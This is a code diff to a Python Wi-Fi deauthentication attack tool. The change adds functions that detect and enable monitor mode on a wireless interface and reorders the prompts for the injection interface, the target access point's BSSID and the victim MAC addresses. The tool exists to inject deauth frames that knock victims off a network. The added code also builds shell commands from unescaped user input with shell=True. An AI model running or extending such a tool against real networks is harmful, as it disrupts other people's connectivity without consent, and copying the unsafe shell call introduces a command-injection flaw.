@@ -63,6 +63,47 @@ def victimListInput():
         print("MAC added...")
     return ret_list
 
+def check_monitor_mode(interface):
+    # give iwconfig command
+    command = f"iwconfig {interface}"
+    try:
+        output = subprocess.check_output(command, shell=True, universal_newlines=True,
+                                         stderr=subprocess.DEVNULL)
+        if 'Mode:Monitor' in output:
+            return True
+        else:
+            return False
+    except:
+        return False
+
+    # Check if 'Mode:Monitor' is present in the output
+
+def enable_monitor_mode(interface):
+    # switch using iwconfig, precon of running this script is that
+    # the user is root so this works.
+    command = f"iwconfig {interface} mode monitor"
+    try:
+        subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except subprocess.CalledProcessError as e:
+        print(f"Error detected... {e}")
+
+    #check for completion.
+    return check_monitor_mode(interface)
+
+def input_interface():
+    while True:
+        i_face = input()
+        if check_monitor_mode(i_face):
+            print("Supported interface selected\n")
+            break
+        else:
+            print(f"Trying to set {i_face} to monitor mode...")
+            if enable_monitor_mode(i_face):
+                print("Interface succesfully set to monitor mode\n")
+                break
+            print("Interface does not exist or is not in monitor mode, try again\n")
+
+    return i_face
 #MAIN --------------------------------------------------------------------------------------------------------
 
 #Check for root
@@ -74,6 +115,10 @@ print("DEAUTH UTILITY ----------------------------------------------------")
 print("Before using, make sure your network adapter is capable of monitoring and packet injection.")
 print("Ensure that drivers are properly installed.\n")
 
+print("Enter name of interface you wish to use for injection.")
+print("(Please note that the interface must be in monitor mode and capable of packet injection!)\n")
+#Might want to check for proper interface input, or mode (subprocess)
+net_iface = input_interface()
 
 print("Enter BSSID of AP (Access Point) to which the victim(s) are connected\n")
 print("Adhering to the following notation: \"HH:HH:HH:HH:HH:HH\" where H is a hexadecimal number\n")
@@ -84,11 +129,6 @@ vic_MAC_list = victimListInput()
 
 #keep track if it's a broadcast.
 bc_mode = vic_MAC_list[0] == "ff:ff:ff:ff:ff:ff"
-
-print("Enter name of interface you wish to use for injection.")
-print("(Please note that the interface must be in monitor mode and capable of packet injection!)\n")
-#Might want to check for proper interface input, or mode (subprocess)
-net_iface = input()
 
 print("Input how many packets you want to send.\n")
 frame_count = inputInt()
